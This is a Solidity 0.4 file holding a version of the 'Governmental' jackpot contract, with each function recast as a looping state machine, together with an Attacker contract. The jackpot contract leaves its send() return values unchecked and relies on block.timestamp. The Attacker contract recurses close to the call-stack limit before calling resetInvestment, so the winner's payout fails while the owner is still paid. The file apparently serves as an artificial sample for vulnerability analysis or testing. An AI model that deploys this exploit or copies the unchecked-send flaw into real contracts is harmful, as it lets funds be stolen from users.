pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    owner = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function invest() {
    uint state = 0;
    while(true) {
      if(state == 0) {
        if (msg.value<jackpot/2) throw;
        state = 1;
      } else if(state == 1) {
        lastInvestor = msg.sender;
        state = 2;
      } else if(state == 2) {
        jackpot += msg.value/2;
        state = 3;
      } else if(state == 3) {
        lastInvestmentTimestamp = block.timestamp;
        return;
      }
    }
  }

  function resetInvestment() {
    uint state = 0;
    while(true) {
      if(state == 0) {
        if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE) throw;
        state = 1;
      } else if(state == 1) {
        lastInvestor.send(jackpot);
        state = 2;
      } else if(state == 2) {
        owner.send(this.balance-1 ether);
        state = 3;
      } else if(state == 3) {
        lastInvestor = 0;
        state = 4;
      } else if(state == 4) {
        jackpot = 1 ether;
        state = 5;
      } else if(state == 5) {
        lastInvestmentTimestamp = 0;
        return;
      }
    }
  }
}

contract Attacker {

  function attack(address target, uint count) {
    uint state = 0;
    while(true) {
      if(state == 0) {
        if (0<=count && count<1023) {
          this.attack.gas(msg.gas-2000)(target, count+1);
          return;
        } else {
          state = 1;
        }
      } else if(state == 1) {
        Governmental(target).resetInvestment();
        return;
      }
    }
  }
}